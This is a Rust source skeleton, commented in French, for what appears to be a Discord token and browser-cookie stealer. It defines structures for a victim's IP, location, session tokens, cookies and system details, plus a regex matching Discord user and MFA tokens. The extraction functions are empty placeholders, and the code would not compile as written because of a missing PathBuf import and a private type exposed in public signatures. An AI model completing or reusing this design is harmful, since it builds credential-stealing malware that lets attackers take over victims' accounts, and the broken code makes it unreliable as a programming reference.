use regex::Regex;
use std::path::Path;
use std::fs;
use serde::{Deserialize, Serialize};

pub struct Extractor {
    /// Chemin personnalisé vers le dossier Discord
    discord_path: Option<PathBuf>,
    /// Regex pré-compilée pour extraire les tokens Discord
    token_regex: Regex,
    /// Chemins de profils navigateurs à scanner
    browser_paths: Vec<PathBuf>,
}

#[derive(Serialize, Deserialize, Default, Debug)]
pub struct ExtractedData {
    pub ip: String,
    pub location: String,
    pub tokens: Vec<String>,
    pub system_info: SystemInfo,
    pub timestamp: u64,
    #[serde(default)]
    pub browser_cookies: Vec<BrowserCookie>,
}

#[derive(Serialize, Deserialize, Default, Debug)]
pub struct BrowserCookie {
    pub domain: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires: u64,
}

#[derive(Serialize, Deserialize, Default)]
struct SystemInfo {
  #[serde(default)]
  user_agent: Option<String>,
  os: String,
  cpu: String,
  #[serde(default)]
  gpu: Option<String>,
  ram: u64,
}


impl Extractor {
    pub fn new() -> Self {
        Extractor {
            discord_path: None,
            token_regex: Regex::new(r#"mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}"#).unwrap(),
            browser_paths: Vec::new(),
        }
    }

    pub fn extract_discord_tokens(&self) -> Vec<String> {
        // Placeholder
        Vec::new()
    }

    pub fn extract_browser_data(&self) -> Vec<BrowserCookie> {
        // Placeholder
        Vec::new()
    }

    pub fn collect_system_info(&self) -> SystemInfo {
        // Placeholder
        SystemInfo::default()
    }

    fn find_discord_storage_location(&self) -> Option<String> {
        // Placeholder
        None
    }
}
